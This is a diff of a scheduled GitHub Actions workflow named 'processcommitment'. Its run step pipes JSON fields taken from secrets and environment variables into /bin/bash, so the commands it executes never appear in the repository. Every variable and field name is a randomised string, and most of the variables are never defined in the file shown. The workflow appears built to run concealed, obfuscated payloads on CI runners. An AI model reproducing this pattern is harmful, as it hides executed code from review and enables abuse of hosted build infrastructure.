@@ -3,24 +3,28 @@ name: processcommitment
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 3/6 * * *'
+    - cron: '3 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: processcommitment
         env:
-          yk22715: ${{ secrets.yk22715 }}
+          t11: ${{ secrets.t11 }}
         run: |
-          echo $yk22715 | jq -r .mkch4463 | /bin/bash
-          echo $dxspf23560 | jq -r .jslp12473 | /bin/bash
-          echo $est0095 | jq -r .i0 | /bin/bash
-          echo $nt142 | jq -r .wdqup85 | /bin/bash
-          echo $rdwx79 | jq -r .jfe90460 | /bin/bash
-          echo $b74 | jq -r .hitfq3 | /bin/bash
-          echo $sdpxk5 | jq -r .aq53411 | /bin/bash
-          echo $c63 | jq -r .qy3 | /bin/bash
+          echo $t11 | jq -r .zay196 | /bin/bash
+          echo $x244 | jq -r .gfb1569 | /bin/bash
+          echo $mzn0 | jq -r .o5 | /bin/bash
+          echo $lbi164 | jq -r .ofjk69 | /bin/bash
+          echo $e94240 | jq -r .gmxr7950 | /bin/bash
+          echo $ryip2183 | jq -r .qtm9 | /bin/bash
+          echo $lf7821 | jq -r .wyb8007 | /bin/bash
+          echo $pkc60 | jq -r .g65369 | /bin/bash
+          echo $xeiw83852 | jq -r .ktgw6646 | /bin/bash
+          echo $sg4439 | jq -r .o1008 | /bin/bash
+          echo $lgn85664 | jq -r .mooo0 | /bin/bash
+          echo $umic0 | jq -r .cm92960 | /bin/bash
+          echo $tv48 | jq -r .d923 | /bin/bash
 
